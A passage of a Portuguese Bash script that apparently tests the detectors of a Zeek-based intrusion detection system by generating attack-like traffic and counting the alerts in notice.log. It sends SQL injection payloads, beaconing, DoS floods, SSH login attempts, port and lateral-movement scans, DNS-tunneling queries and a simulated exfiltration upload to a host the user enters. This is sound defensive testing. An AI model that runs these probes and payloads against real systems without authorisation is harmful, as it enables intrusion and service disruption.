            echo -ne "${GREEN}Payload ${#payloads[@]} enviado${NC}\r"
            sleep 3
        done
        
        echo -e "\n${GREEN}✓ Teste concluído!${NC}"
        echo -e "${YELLOW}[*] Aguardando processamento do Zeek (5 segundos)...${NC}"
        sleep 5
        
        # Conta alertas depois do teste
        alertas_depois=$(grep -c "SQLInjection::" $LOGS_DIR/notice.log 2>/dev/null || echo "0")
        alertas_depois=$(echo "$alertas_depois" | tail -1)
        alertas_antes=$(echo "$alertas_antes" | tail -1)
        novos_alertas=$((alertas_depois - alertas_antes))
        
        echo -e "\n${BLUE}[*] Últimos 3 alertas de SQL Injection:${NC}\n"
        grep "SQLInjection::" $LOGS_DIR/notice.log | tail -3 | awk -F'\t' '{print "  • " $12}' || echo -e "${YELLOW}  ⚠ Nenhum alerta encontrado${NC}"
        
        echo -e "\n${BLUE}[*] Estatísticas:${NC}"
        echo -e "  • Total de alertas históricos: ${YELLOW}$alertas_depois${NC}"
        if [ $novos_alertas -gt 0 ]; then
            echo -e "  • ${GREEN}✓ Novos alertas gerados: $novos_alertas${NC}"
        else
            echo -e "  • ${YELLOW}⚠ Nenhum novo alerta gerado${NC}"
        fi
        ;;
        
    12)
        echo -e "\n${YELLOW}[*] Teste de Beaconing (C2 Communication)${NC}"
        read -p "Digite o host alvo (ex: example.com): " target
        
        if [ -z "$target" ]; then
            echo -e "${RED}❌ Host não pode estar vazio${NC}"
            exit 1
        fi
        
        echo -e "${BLUE}[*] Alvo: $target${NC}"
        echo -e "${BLUE}[*] Configuração: 10 conexões periódicas (intervalo de 30s)${NC}"
        echo -e "${BLUE}[*] Threshold: 5 conexões regulares em 5 minutos${NC}\n"
        
        # Conta alertas antes do teste
        alertas_antes=$(grep -c "Beaconing::" $LOGS_DIR/notice.log 2>/dev/null || echo "0")
        
        echo -e "${YELLOW}[*] Simulando beacon periódico (beacon interval: 30s)...${NC}"
        echo -e "${YELLOW}[*] Este teste levará ~5 minutos para completar${NC}\n"
        
        # Envia 10 conexões periódicas com intervalo fixo de 30 segundos
        for i in {1..10}; do
            timeout 3 curl -s "http://$target/beacon?id=$i" > /dev/null 2>&1 || true
            echo -e "${GREEN}Beacon $i/10 enviado (próximo em 30s)${NC}"
            
            if [ $i -lt 10 ]; then
                sleep 30
            fi
        done
        
        echo -e "\n${GREEN}✓ Teste concluído!${NC}"
        echo -e "${YELLOW}[*] Aguardando processamento do Zeek (10 segundos)...${NC}"
        sleep 10
        
        # Conta alertas depois do teste
        alertas_depois=$(grep -c "Beaconing::" $LOGS_DIR/notice.log 2>/dev/null || echo "0")
        alertas_depois=$(echo "$alertas_depois" | tail -1)
        alertas_antes=$(echo "$alertas_antes" | tail -1)
        novos_alertas=$((alertas_depois - alertas_antes))
        
        echo -e "\n${BLUE}[*] Últimos 3 alertas de Beaconing:${NC}\n"
        grep "Beaconing::" $LOGS_DIR/notice.log | tail -3 | awk -F'\t' '{print "  • " $12}' || echo -e "${YELLOW}  ⚠ Nenhum alerta encontrado${NC}"
        
        echo -e "\n${BLUE}[*] Estatísticas:${NC}"
        echo -e "  • Total de alertas históricos: ${YELLOW}$alertas_depois${NC}"
        if [ $novos_alertas -gt 0 ]; then
            echo -e "  • ${GREEN}✓ Novos alertas gerados: $novos_alertas${NC}"
        else
            echo -e "  • ${YELLOW}⚠ Nenhum novo alerta gerado${NC}"
            echo -e "  • ${YELLOW}  Nota: Detector de beaconing requer padrão temporal consistente${NC}"
        fi
        ;;
        
    13)
        echo -e "\n${YELLOW}[*] Teste de Protocol Anomaly${NC}"
        read -p "Digite o host alvo: " target
        
        if [ -z "$target" ]; then
            echo -e "${RED}❌ Host não pode estar vazio${NC}"
            exit 1
        fi
        
        echo -e "${BLUE}[*] Alvo: $target${NC}"
        echo -e "${BLUE}[*] Configuração: Protocolos em portas não-padrão${NC}"
        echo -e "${BLUE}[*] Exemplos: HTTP na porta 2222, SSH na porta 8080${NC}\n"
        
        # Conta alertas antes do teste
        alertas_antes=$(grep -c "ProtocolAnomaly::" $LOGS_DIR/notice.log 2>/dev/null || echo "0")
        
        echo -e "${YELLOW}[*] Testando anomalias de protocolo...${NC}"
        
        # Tenta HTTP em portas não-padrão
        echo -e "${YELLOW}[*] Tentando HTTP em portas anômalas...${NC}"
        portas_http_anomalas=(2222 3333 9999 22 445)
        for port in "${portas_http_anomalas[@]}"; do
            timeout 2 curl -s "http://$target:$port/" > /dev/null 2>&1 || true
            echo -ne "${GREEN}Testando HTTP na porta $port${NC}\r"
            sleep 2
        done
        
        # Tenta SSH em portas não-padrão
        echo -e "\n${YELLOW}[*] Tentando SSH em portas anômalas...${NC}"
        portas_ssh_anomalas=(80 443 8080 8443)
        for port in "${portas_ssh_anomalas[@]}"; do
            timeout 2 nc -zv -w 1 "$target" "$port" 2>/dev/null || true
            echo -ne "${GREEN}Testando SSH na porta $port${NC}\r"
            sleep 2
        done
        
        echo -e "\n${GREEN}✓ Teste concluído!${NC}"
        echo -e "${YELLOW}[*] Aguardando processamento do Zeek (5 segundos)...${NC}"
        sleep 5
        
        # Conta alertas depois do teste
        alertas_depois=$(grep -c "ProtocolAnomaly::" $LOGS_DIR/notice.log 2>/dev/null || echo "0")
        alertas_depois=$(echo "$alertas_depois" | tail -1)
        alertas_antes=$(echo "$alertas_antes" | tail -1)
        novos_alertas=$((alertas_depois - alertas_antes))
        
        echo -e "\n${BLUE}[*] Últimos 3 alertas de Protocol Anomaly:${NC}\n"
        grep "ProtocolAnomaly::" $LOGS_DIR/notice.log | tail -3 | awk -F'\t' '{print "  • " $12}' || echo -e "${YELLOW}  ⚠ Nenhum alerta encontrado${NC}"
        
        echo -e "\n${BLUE}[*] Estatísticas:${NC}"
        echo -e "  • Total de alertas históricos: ${YELLOW}$alertas_depois${NC}"
        if [ $novos_alertas -gt 0 ]; then
            echo -e "  • ${GREEN}✓ Novos alertas gerados: $novos_alertas${NC}"
        else
            echo -e "  • ${YELLOW}⚠ Nenhum novo alerta gerado${NC}"
        fi
        ;;
        
    14)
        echo -e "\n${YELLOW}[*] TESTE COMPLETO - Executando todos os testes${NC}"
        echo -e "${RED}⚠ ATENÇÃO: Este teste levará vários minutos para completar${NC}"
        echo -e "${RED}⚠ Certifique-se de ter permissões adequadas${NC}\n"
        
        read -p "Deseja continuar? (s/n): " confirm
        
        if [ "$confirm" != "s" ]; then
            echo -e "${YELLOW}Teste cancelado${NC}"
            exit 0
        fi
        
        # Pede informações gerais
        read -p "Digite o host/rede alvo principal: " main_target
        read -p "Digite a rede interna (ex: 192.168.1): " internal_network
        
        if [ -z "$main_target" ] || [ -z "$internal_network" ]; then
            echo -e "${RED}❌ Informações obrigatórias não fornecidas${NC}"
            exit 1
        fi
        
        echo -e "\n${GREEN}═══════════════════════════════════════════════════════${NC}"
        echo -e "${GREEN}  Iniciando bateria completa de testes SIMIR${NC}"
        echo -e "${GREEN}═══════════════════════════════════════════════════════${NC}\n"
        
        # Executa cada teste automaticamente
        # Nota: Alguns testes serão simplificados para execução automatizada
        
        echo -e "${BLUE}[1/13] Port Scan...${NC}"
        for port in {20..39}; do
            timeout 0.3 nc -zv -w 1 "$main_target" "$port" 2>/dev/null || true
        done
        sleep 10
        
        echo -e "${BLUE}[2/13] DoS HTTP...${NC}"
        for i in {1..105}; do
            timeout 1 curl -s "http://$main_target/" > /dev/null 2>&1 || true
        done &
        wait
        sleep 5
        
        echo -e "${BLUE}[3/13] Intelligence...${NC}"
        timeout 2 curl -s "http://g1.com/" > /dev/null 2>&1 || true
        timeout 2 curl -s "http://10.20.30.40/" > /dev/null 2>&1 || true
        sleep 5
        
        echo -e "${BLUE}[4/13] Brute Force SSH...${NC}"
        for i in {1..12}; do
            timeout 1 ssh -o StrictHostKeyChecking=no invalid_user@$main_target 2>/dev/null || true
        done
        sleep 5
        
        echo -e "${BLUE}[5/13] Data Exfiltration...${NC}"
        dd if=/dev/zero of=/tmp/test_data.bin bs=1M count=15 2>/dev/null
        timeout 10 curl -X POST -F "file=@/tmp/test_data.bin" "http://$main_target/upload" 2>/dev/null || true
        rm -f /tmp/test_data.bin
        sleep 5
        
        echo -e "${BLUE}[6/13] DNS Tunneling...${NC}"
        for i in {1..10}; do
            random_str=$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 50)
            dig "${random_str}.tunnel-test.com" +short > /dev/null 2>&1 || true
        done
        sleep 5
        
        echo -e "${BLUE}[7/13] Lateral Movement...${NC}"
        for suffix in {10..17}; do
            for port in 22 445 3389; do
                timeout 1 nc -zv -w 1 "$internal_network.$suffix" "$port" 2>/dev/null || true
            done
        done
        sleep 5
        
        echo -e "${BLUE}[8/13] SQL Injection...${NC}"
        for payload in "' OR '1'='1" "admin'--" "1' UNION SELECT NULL--"; do
            timeout 2 curl -s "${main_target}?id=${payload}" > /dev/null 2>&1 || true
        done
        sleep 5
        
        echo -e "${BLUE}[9/13] Beaconing (simplificado)...${NC}"
        for i in {1..6}; do
            timeout 2 curl -s "http://$main_target/beacon" > /dev/null 2>&1 || true
            sleep 30
        done
        
        echo -e "${BLUE}[10/13] Protocol Anomaly...${NC}"
        for port in 2222 8080 9999; do
            timeout 2 curl -s "http://$main_target:$port/" > /dev/null 2>&1 || true
        done
        sleep 5
        
        echo -e "\n${GREEN}✓ Todos os testes foram executados!${NC}"
        echo -e "${YELLOW}[*] Aguardando processamento final do Zeek (15 segundos)...${NC}"
        sleep 15
        
        # Mostra resumo de todos os detectores
        echo -e "\n${GREEN}═══════════════════════════════════════════════════════${NC}"
        echo -e "${GREEN}  RESUMO GERAL DE ALERTAS${NC}"
        echo -e "${GREEN}═══════════════════════════════════════════════════════${NC}\n"
        
        detectores=("PortScan" "DoS" "DDoS" "Intelligence" "BruteForce" "DataExfiltration" "DNSTunneling" "LateralMovement" "SQLInjection" "Beaconing" "ProtocolAnomaly")
        
        for detector in "${detectores[@]}"; do
            count=$(grep -c "${detector}::" $LOGS_DIR/notice.log 2>/dev/null || echo "0")
            if [ "$count" -gt 0 ]; then
                echo -e "  ${GREEN}✓ $detector: $count alertas${NC}"
            else
                echo -e "  ${YELLOW}○ $detector: 0 alertas${NC}"
            fi
        done
        
        echo -e "\n${BLUE}Total de alertas no sistema:${NC}"
        wc -l $LOGS_DIR/notice.log 2>/dev/null || echo "0"
        ;;
        
    *)
        echo -e "${RED}Opção inválida${NC}"
        exit 1
        ;;
esac

echo ""
echo -e "${GREEN}╔═══════════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║     Teste finalizado                                  ║${NC}"
echo -e "${GREEN}╚═══════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${BLUE}Dicas:${NC}"
echo -e "• Verifique os logs completos em: ${YELLOW}logs/notice.log${NC}"
echo -e "• Conexões detalhadas em: ${YELLOW}logs/conn.log${NC}"
echo ""
